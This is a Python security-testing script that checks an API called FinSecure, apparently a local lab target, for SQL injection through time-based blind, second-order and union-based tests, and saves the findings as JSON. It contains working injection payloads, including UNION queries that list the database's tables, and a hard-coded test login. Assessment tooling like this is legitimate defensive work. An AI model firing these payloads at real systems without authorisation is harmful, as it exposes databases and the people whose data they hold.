#!/usr/bin/env python3
"""
sqli_tester.py — SQL Injection DAST Module
===========================================
Tests the FinSecure API for SQL injection vulnerabilities:
  1. Time-based blind SQLi detection
  2. Second-order injection (store via note → trigger via search)
  3. Union-based data extraction PoC

Usage:
    python assessment/dast/sqli_tester.py --target http://localhost:8080
"""

import argparse
import json
import os
import time
from datetime import datetime
from pathlib import Path

import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()
FINDINGS_FILE = "findings/dast_results.json"
FINDINGS: list[dict] = []

# ─── Helpers ──────────────────────────────────────────────────────────────────

def get_auth_token(target: str) -> str | None:
    """Login as alice and return JWT token."""
    try:
        r = requests.post(f"{target}/api/auth/login",
                          json={"username": "alice", "password": "alice123"}, timeout=5)
        if r.status_code == 200:
            return r.json().get("token")
    except Exception:
        pass
    return None


def auth_headers(token: str) -> dict:
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


def add_finding(title: str, severity: str, description: str, evidence: str, poc: list[str]) -> None:
    FINDINGS.append({
        "tool": "sqli_tester", "title": title, "severity": severity,
        "description": description, "evidence": evidence,
        "poc_steps": poc, "timestamp": datetime.utcnow().isoformat() + "Z",
    })


# ─── Test 1: Time-Based Blind SQLi ────────────────────────────────────────────

def test_time_based_blind(target: str, token: str) -> None:
    console.print(Panel("[bold cyan]TEST 1: Time-Based Blind SQL Injection[/bold cyan]", border_style="cyan"))

    # H2 uses CALL SLEEP() syntax; also try WAITFOR (MSSQL), pg_sleep (Postgres)
    time_payloads = [
        ("H2 SLEEP",       "' OR SLEEP(3)--"),
        ("H2 CALL",        "'; CALL SLEEP(3)--"),
        ("Generic OR 1=1", "' OR '1'='1"),
        ("Comment close",  "' --"),
        ("UNION probe",    "' UNION SELECT NULL--"),
    ]

    headers = auth_headers(token)

    table = Table(box=box.SIMPLE, header_style="bold")
    table.add_column("Payload", width=30)
    table.add_column("Response Time", width=16)
    table.add_column("HTTP", width=8)
    table.add_column("Result", width=20)

    for label, payload in time_payloads:
        try:
            url = f"{target}/api/accounts/search"
            start = time.time()
            r = requests.get(url, params={"note": payload}, headers=headers, timeout=10)
            elapsed = time.time() - start

            is_vulnerable = elapsed > 2.5  # Triggered a sleep

            # Check for error-based SQLi (DB error in response)
            is_error_based = False
            try:
                body = r.json()
                error_msg = str(body.get("error", "") or body.get("message", ""))
                is_error_based = any(kw in error_msg.lower() for kw in
                                     ["sql", "jdbc", "h2", "syntax", "unterminated"])
            except Exception:
                pass

            if is_vulnerable:
                result = "[bold red]✗ TIME VULN[/bold red]"
                add_finding(
                    title="Time-Based Blind SQL Injection",
                    severity="CRITICAL",
                    description="Server response delayed by >2.5s when SLEEP payload injected. Confirms blind SQLi.",
                    evidence=f"Payload: {payload} | Response time: {elapsed:.2f}s",
                    poc=[
                        f"GET {target}/api/accounts/search?note={payload}",
                        "Observe response time > 2.5 seconds",
                        "Confirms server executes injected SQL",
                    ],
                )
            elif is_error_based:
                result = "[red]✗ ERROR-BASED[/red]"
                add_finding(
                    title="Error-Based SQL Injection",
                    severity="HIGH",
                    description="SQL error message returned in response body — confirms injection point.",
                    evidence=f"Payload: {payload} | Error: {error_msg[:200]}",
                    poc=[f"GET {target}/api/accounts/search?note={payload}"],
                )
            else:
                result = "[green]✓ No delay[/green]"

            table.add_row(label, f"{elapsed:.2f}s", str(r.status_code), result)

        except requests.exceptions.Timeout:
            table.add_row(label, ">10s (TIMEOUT)", "---", "[bold red]✗ TIMEOUT VULN[/bold red]")
        except requests.exceptions.ConnectionError:
            table.add_row(label, "N/A", "ERR", "[dim]Connection refused[/dim]")

    console.print(table)


# ─── Test 2: Second-Order SQLi ────────────────────────────────────────────────

def test_second_order(target: str, token: str) -> None:
    console.print(Panel("[bold cyan]TEST 2: Second-Order SQL Injection[/bold cyan]", border_style="cyan"))

    headers = auth_headers(token)

    # Step 1: Store the payload in account note (appears safe at storage time)
    sqli_payload = "' OR '1'='1"
    console.print(f"[dim]Step 1:[/dim] Storing SQLi payload in account note: [yellow]{sqli_payload}[/yellow]")

    try:
        r1 = requests.post(
            f"{target}/api/accounts/1/note",
            headers=headers,
            json={"note": sqli_payload},
            timeout=5,
        )
        if r1.status_code == 200:
            console.print(f"[green]  ✓ Note stored successfully (HTTP {r1.status_code})[/green]")
        else:
            console.print(f"[yellow]  Note store returned HTTP {r1.status_code}[/yellow]")

        # Step 2: Trigger the payload via the search endpoint (which uses stored note in raw SQL)
        console.print(f"[dim]Step 2:[/dim] Triggering via /api/accounts/search?note={sqli_payload}")

        r2 = requests.get(
            f"{target}/api/accounts/search",
            params={"note": sqli_payload},
            headers=headers,
            timeout=5,
        )

        try:
            data = r2.json()
            result_count = len(data) if isinstance(data, list) else 0
        except Exception:
            result_count = 0
            data = {}

        if r2.status_code == 200 and result_count > 1:
            console.print(f"[bold red]✗ VULNERABLE — Second-Order SQLi confirmed![/bold red]")
            console.print(f"[red]  Payload returned {result_count} rows (should be 0 or 1)[/red]")
            add_finding(
                title="Second-Order SQL Injection in /api/accounts/search",
                severity="CRITICAL",
                description=(
                    "SQL injection via stored note field. Payload stored safely, then used "
                    "unsafely in raw SQL: SELECT * FROM accounts WHERE profile_note = '<payload>'"
                ),
                evidence=f"Payload '{sqli_payload}' returned {result_count} rows.",
                poc=[
                    f"POST {target}/api/accounts/1/note  body: {{note: \"' OR '1'='1\"}}",
                    f"GET {target}/api/accounts/search?note=' OR '1'='1",
                    f"Response: {result_count} account rows returned (all accounts exposed)",
                ],
            )
        elif "error" in str(data):
            console.print(f"[red]  SQL error in response — injection partially working[/red]")
        else:
            console.print(f"[green]✓ No second-order injection detected (returned {result_count} rows)[/green]")

    except requests.exceptions.ConnectionError:
        console.print("[dim]API not reachable — skipping second-order test[/dim]")


# ─── Test 3: Union-Based Data Extraction ──────────────────────────────────────

def test_union_based(target: str, token: str) -> None:
    console.print(Panel("[bold cyan]TEST 3: Union-Based Data Extraction[/bold cyan]", border_style="cyan"))
    headers = auth_headers(token)

    # Try to determine column count first, then extract data
    union_payloads = [
        ("Column count 1", "' UNION SELECT NULL--"),
        ("Column count 4", "' UNION SELECT NULL,NULL,NULL,NULL--"),
        ("Column count 7", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--"),
        ("Extract H2 version", "' UNION SELECT H2VERSION(),NULL,NULL,NULL,NULL,NULL,NULL--"),
        ("Extract user table", "' UNION SELECT TABLE_NAME,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES--"),
    ]

    table = Table(box=box.SIMPLE, header_style="bold")
    table.add_column("Payload", width=50)
    table.add_column("HTTP", width=8)
    table.add_column("Rows", width=8)
    table.add_column("Result", width=20)

    for label, payload in union_payloads:
        try:
            r = requests.get(f"{target}/api/accounts/search",
                             params={"note": payload}, headers=headers, timeout=5)
            try:
                data = r.json()
                rows = len(data) if isinstance(data, list) else 0
                error = data.get("error", "") if isinstance(data, dict) else ""
            except Exception:
                rows = 0
                error = ""

            if rows > 0:
                result = f"[red]✗ {rows} rows leaked[/red]"
                add_finding(
                    title="Union-Based SQL Injection",
                    severity="CRITICAL",
                    description="UNION SELECT returned data from database tables, confirming full SQL injection.",
                    evidence=f"Payload '{payload}' returned {rows} rows",
                    poc=[f"GET {target}/api/accounts/search?note={payload}"],
                )
            elif error:
                result = "[yellow]SQL error[/yellow]"
            else:
                result = "[green]✓ No data[/green]"

            table.add_row(label[:48], str(r.status_code), str(rows), result)

        except requests.exceptions.ConnectionError:
            table.add_row(label[:48], "N/A", "N/A", "[dim]Offline[/dim]")

    console.print(table)


# ─── Save & Main ──────────────────────────────────────────────────────────────

def save_findings() -> None:
    os.makedirs("findings", exist_ok=True)
    existing = []
    if Path(FINDINGS_FILE).exists():
        with open(FINDINGS_FILE) as f:
            try:
                existing = json.load(f).get("findings", [])
            except Exception:
                pass
    with open(FINDINGS_FILE, "w") as f:
        json.dump({"last_updated": datetime.utcnow().isoformat() + "Z",
                   "findings": existing + FINDINGS}, f, indent=2)
    console.print(f"\n[green]✓ Findings saved to[/green] [bold]{FINDINGS_FILE}[/bold]")


def main():
    parser = argparse.ArgumentParser(description="FinSecure SQLi Tester")
    parser.add_argument("--target", default="http://localhost:8080")
    args = parser.parse_args()

    console.print(Panel(
        "[bold cyan]FinSecure API — SQL Injection Tester[/bold cyan]\n"
        "[dim]Time-Based Blind · Second-Order · Union-Based Extraction[/dim]",
        border_style="cyan",
    ))
    console.print(f"[dim]Target:[/dim] [bold]{args.target}[/bold]\n")

    token = get_auth_token(args.target)
    if not token:
        console.print("[yellow]⚠  Could not get auth token. Running unauthenticated...[/yellow]\n")
        token = "INVALID"

    test_time_based_blind(args.target, token)
    console.print()
    test_second_order(args.target, token)
    console.print()
    test_union_based(args.target, token)
    save_findings()

    console.print(f"\n[bold]{'[red]⚠  ' + str(len(FINDINGS)) + ' SQLi findings!' if FINDINGS else '[green]✓ No SQLi found'}[/bold]")


if __name__ == "__main__":
    main()
